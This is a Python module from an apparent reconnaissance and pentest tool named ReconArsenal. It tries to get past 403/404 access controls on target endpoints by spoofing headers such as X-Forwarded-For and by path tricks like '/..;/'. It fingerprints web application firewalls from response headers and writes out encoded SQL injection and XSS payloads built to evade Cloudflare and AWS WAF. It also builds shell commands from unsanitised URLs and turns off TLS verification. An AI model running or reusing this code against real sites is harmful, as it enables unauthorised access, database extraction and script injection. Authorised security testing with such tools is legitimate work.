
#!/usr/bin/env python3
"""
Bypass techniques module for ReconArsenal
"""

import os
import concurrent.futures
from colorama import Fore
from .utils import print_colored, show_progress, save_to_file, check_command, get_command_output

def status_code_bypass(endpoints, output_dir):
    """Attempt to bypass 403/404 status codes"""
    print_colored("[*] Attempting 403/404 bypass techniques...", Fore.BLUE)
    
    bypass_dir = os.path.join(output_dir, "bypass")
    status_dir = os.path.join(bypass_dir, "status_code")
    
    # Create directory if it doesn't exist
    if not os.path.exists(status_dir):
        os.makedirs(status_dir)
    
    # Check for tools
    tools = {
        "bypass4xx": check_command("bypass4xx"),
        "4-zero-3": check_command("4-zero-3"),
        "403fuzzer": check_command("403fuzzer"),
        "dirbrute": check_command("dirbrute"),
        "dirsearch": check_command("dirsearch")
    }
    
    # Custom bypass techniques if no tools are available
    bypass_headers = [
        "X-Forwarded-For: 127.0.0.1",
        "X-Forwarded-Host: 127.0.0.1",
        "X-Host: 127.0.0.1",
        "X-Original-URL: /",
        "X-Rewrite-URL: /",
        "X-Custom-IP-Authorization: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "X-Remote-IP: 127.0.0.1",
        "X-Remote-Addr: 127.0.0.1",
        "X-ProxyUser-Ip: 127.0.0.1",
        "X-Original-Host: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "Host: localhost",
        "Referer: https://www.google.com/",
        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15",
        "Client-IP: 127.0.0.1"
    ]
    
    bypass_paths = [
        "/",
        "//",
        "/%2f/",
        "/./",
        "/./.",
        "/..;/",
        "/;/",
        "/.json",
        "/.html",
        "/.php",
        "/.asp",
        "/..%2f",
        "/%20/",
        "/%09/",
        "/x/../",
        "/static/../",
        "/css/../",
        "/js/../",
        "/img/../"
    ]
    
    # Save endpoints to file
    endpoints_file = os.path.join(status_dir, "endpoints.txt")
    save_to_file(endpoints, endpoints_file)
    
    successful_bypasses = []
    
    # Use bypass4xx if available
    if tools.get("bypass4xx"):
        print_colored("[*] Using bypass4xx for status code bypass...", Fore.BLUE)
        
        bypass4xx_output = os.path.join(status_dir, "bypass4xx_results.txt")
        bypass4xx_cmd = f"bypass4xx -f {endpoints_file} -o {bypass4xx_output}"
        
        try:
            os.system(bypass4xx_cmd)
            
            # Check if results file exists and parse it
            if os.path.exists(bypass4xx_output):
                with open(bypass4xx_output, 'r') as f:
                    for line in f:
                        if "[+]" in line and "200" in line:
                            successful_bypasses.append(line.strip())
                
                print_colored(f"[+] bypass4xx found {len(successful_bypasses)} successful bypasses", Fore.GREEN)
            
        except Exception as e:
            print_colored(f"[!] Error running bypass4xx: {str(e)}", Fore.RED)
    
    # Use 4-zero-3 if available
    elif tools.get("4-zero-3"):
        print_colored("[*] Using 4-zero-3 for status code bypass...", Fore.BLUE)
        
        for endpoint in endpoints:
            zero3_output = os.path.join(status_dir, f"{endpoint.replace('/', '_')}_403.txt")
            zero3_cmd = f"4-zero-3 -u {endpoint} -o {zero3_output}"
            
            try:
                os.system(zero3_cmd)
                
                # Check if results file exists and parse it
                if os.path.exists(zero3_output):
                    with open(zero3_output, 'r') as f:
                        for line in f:
                            if "200" in line:
                                successful_bypasses.append(line.strip())
                
            except Exception as e:
                print_colored(f"[!] Error running 4-zero-3 on {endpoint}: {str(e)}", Fore.RED)
        
        print_colored(f"[+] 4-zero-3 found {len(successful_bypasses)} successful bypasses", Fore.GREEN)
    
    # If no dedicated bypass tools are available, use basic check
    else:
        print_colored("[*] Using custom bypass techniques...", Fore.BLUE)
        
        import requests
        from urllib.parse import urlparse
        
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        progress = show_progress(len(endpoints), "Testing bypass techniques")
        
        for endpoint in endpoints:
            try:
                # Get initial status code
                initial_response = requests.get(endpoint, timeout=10, verify=False)
                status_code = initial_response.status_code
                
                # Only attempt bypass if 403 or 404
                if status_code in [403, 404]:
                    # Try header bypasses
                    for header in bypass_headers:
                        header_name, header_value = header.split(": ")
                        headers = {header_name: header_value}
                        
                        try:
                            header_response = requests.get(endpoint, headers=headers, timeout=10, verify=False)
                            
                            if header_response.status_code == 200:
                                bypass = f"{endpoint} [Header Bypass: {header}] 200 OK"
                                successful_bypasses.append(bypass)
                                break
                        except:
                            pass
                    
                    # If header bypass didn't work, try path modifications
                    if not any(endpoint in bypass for bypass in successful_bypasses):
                        parsed_url = urlparse(endpoint)
                        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                        
                        for path in bypass_paths:
                            modified_path = parsed_url.path + path
                            modified_url = f"{base_url}{modified_path}"
                            
                            if parsed_url.query:
                                modified_url += f"?{parsed_url.query}"
                            
                            try:
                                path_response = requests.get(modified_url, timeout=10, verify=False)
                                
                                if path_response.status_code == 200:
                                    bypass = f"{modified_url} [Path Bypass: {path}] 200 OK"
                                    successful_bypasses.append(bypass)
                                    break
                            except:
                                pass
            
            except Exception as e:
                print_colored(f"[!] Error testing bypasses on {endpoint}: {str(e)}", Fore.RED)
            
            finally:
                progress.update(1)
        
        progress.close()
        print_colored(f"[+] Found {len(successful_bypasses)} successful bypasses", Fore.GREEN)
    
    # Save successful bypasses
    if successful_bypasses:
        bypass_file = os.path.join(status_dir, "successful_bypasses.txt")
        save_to_file(successful_bypasses, bypass_file)
    
    return successful_bypasses

def waf_bypass(endpoints, output_dir):
    """Attempt WAF bypass techniques"""
    print_colored("[*] Attempting WAF bypass techniques...", Fore.BLUE)
    
    bypass_dir = os.path.join(output_dir, "bypass")
    waf_dir = os.path.join(bypass_dir, "waf")
    
    # Create directory if it doesn't exist
    if not os.path.exists(waf_dir):
        os.makedirs(waf_dir)
    
    # Check for tools
    tools = {
        "wafw00f": check_command("wafw00f"),
        "wafwoof": check_command("wafwoof"),
        "wafninja": check_command("wafninja")
    }
    
    if not any(tools.values()):
        print_colored("[!] WAF detection tools not found. Please install wafw00f, wafwoof, or wafninja.", Fore.YELLOW)
    
    # Save endpoints to file
    endpoints_file = os.path.join(waf_dir, "endpoints.txt")
    save_to_file(endpoints, endpoints_file)
    
    waf_results = []
    
    # Extract domains from endpoints
    domains = set()
    for endpoint in endpoints:
        from urllib.parse import urlparse
        parsed_url = urlparse(endpoint)
        domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
        domains.add(domain)
    
    # Save domains to file
    domains_file = os.path.join(waf_dir, "domains.txt")
    save_to_file(list(domains), domains_file)
    
    # Use wafw00f if available
    if tools.get("wafw00f"):
        print_colored("[*] Using wafw00f for WAF detection...", Fore.BLUE)
        
        wafw00f_output = os.path.join(waf_dir, "wafw00f_results.txt")
        wafw00f_cmd = f"wafw00f -i {domains_file} -o {wafw00f_output}"
        
        try:
            os.system(wafw00f_cmd)
            
            # Check if results file exists and parse it
            if os.path.exists(wafw00f_output):
                with open(wafw00f_output, 'r') as f:
                    waf_results = [line.strip() for line in f if line.strip()]
                
                print_colored(f"[+] wafw00f detected WAFs for {len(waf_results)} domains", Fore.GREEN)
            
        except Exception as e:
            print_colored(f"[!] Error running wafw00f: {str(e)}", Fore.RED)
    
    # If no WAF detection tools available or no WAFs detected, use basic check
    if not tools.get("wafw00f") or not waf_results:
        print_colored("[*] Using basic WAF detection...", Fore.BLUE)
        
        import requests
        
        # WAF detection signatures
        waf_signatures = {
            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
            "AWS WAF": ["x-amzn-waf", "x-amz-cf-id"],
            "Akamai": ["akamai", "akamaighost"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "Incapsula": ["incap_ses", "_incapsula_"],
            "F5 BIG-IP": ["BigIP", "F5"],
            "Sucuri": ["sucuri", "cloudproxy"],
            "Imperva": ["imperva", "incapsula"],
            "Barracuda": ["barracuda"],
            "Fortinet": ["fortigate", "fortiweb"],
            "Citrix": ["netscaler", "citrix"]
        }
        
        basic_waf_results = []
        
        for domain in domains:
            try:
                response = requests.get(domain, timeout=10, verify=False)
                
                detected_wafs = []
                
                # Check response headers for WAF signatures
                for waf_name, signatures in waf_signatures.items():
                    for signature in signatures:
                        # Check in headers
                        for header, value in response.headers.items():
                            if signature.lower() in header.lower() or signature.lower() in value.lower():
                                detected_wafs.append(waf_name)
                                break
                
                if detected_wafs:
                    result = f"{domain}: WAF detected - {', '.join(detected_wafs)}"
                    basic_waf_results.append(result)
                else:
                    result = f"{domain}: No WAF detected"
                    basic_waf_results.append(result)
            
            except Exception as e:
                print_colored(f"[!] Error checking WAF for {domain}: {str(e)}", Fore.RED)
        
        waf_results.extend(basic_waf_results)
        print_colored(f"[+] Basic WAF detection completed for {len(domains)} domains", Fore.GREEN)
    
    # Generate WAF bypass payloads based on detected WAFs
    bypass_payloads = []
    
    # Generic SQL injection WAF bypass payloads
    sql_bypass = [
        "/*!50000%75%6e%69%6f%6e*/ /*!50000%73%65%6c%65%63%74*/",
        "%55%6e%49%6f%4e %53%45%4c%45%43%54",
        "union%09select",
        "union%0Aselect",
        "%2f**%2funion%2f**%2fselect",
        "union%23foo*%2F*bar%0D%0Aselect",
        "%0Atoken=1%27%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA=%27DATABASE%28%29%27%20LIMIT%201--",
        "/*!uNiOn*/ /*!SelECt*/"
    ]
    
    # Generic XSS WAF bypass payloads
    xss_bypass = [
        "%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22alert%28document.domain%29%22%3E",
        "%3Ciframe%2Fsrc%3D%22javascript%3Aalert%28document.domain%29%22%3E",
        "%3Csvg%2Fonload%3Dalert%28document.domain%29%3E",
        "javascript%3Avoid%281%29%3Balert%28document.domain%29%3B",
        "%3Cimg+src%3Dx+onerror%3D%22a%3Dconfirm%2Ca%28document.domain%29%22%3E",
        "%3Cmath%3E%3Cmstyle%3E%3Cselect%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E",
        "%3Ca+href%3D%26%2365%3Bjavascript%3Aalert%28document.domain%29%3Etest%3C%2Fa%3E"
    ]
    
    # Add Cloudflare specific bypasses
    if any("Cloudflare" in result for result in waf_results):
        bypass_payloads.append("# Cloudflare WAF Bypasses")
        bypass_payloads.append("# SQL Injection")
        bypass_payloads.extend(sql_bypass)
        bypass_payloads.append("# XSS")
        bypass_payloads.extend(xss_bypass)
        bypass_payloads.append("# Additional Cloudflare bypasses")
        bypass_payloads.append("%09%0A%0D/*SPACE VARIATION*/ union%09select")
    
    # Add AWS WAF specific bypasses
    if any("AWS WAF" in result for result in waf_results):
        bypass_payloads.append("# AWS WAF Bypasses")
        bypass_payloads.append("# SQL Injection")
        bypass_payloads.extend(sql_bypass)
        bypass_payloads.append("# XSS")
        bypass_payloads.extend(xss_bypass)
        bypass_payloads.append("# Additional AWS WAF bypasses")
        bypass_payloads.append("%0Aselect%0Bfrom")
    
    # Add other generic bypasses if no specific WAFs were identified
    if not bypass_payloads:
        bypass_payloads.append("# Generic WAF Bypasses")
        bypass_payloads.append("# SQL Injection")
        bypass_payloads.extend(sql_bypass)
        bypass_payloads.append("# XSS")
        bypass_payloads.extend(xss_bypass)
    
    # Save WAF detection results
    if waf_results:
        waf_file = os.path.join(waf_dir, "waf_detection.txt")
        save_to_file(waf_results, waf_file)
    
    # Save bypass payloads
    if bypass_payloads:
        bypass_file = os.path.join(waf_dir, "waf_bypass_payloads.txt")
        save_to_file(bypass_payloads, bypass_file)
    
    print_colored(f"[+] WAF detection and bypass payload generation completed", Fore.GREEN)
    
    return waf_results
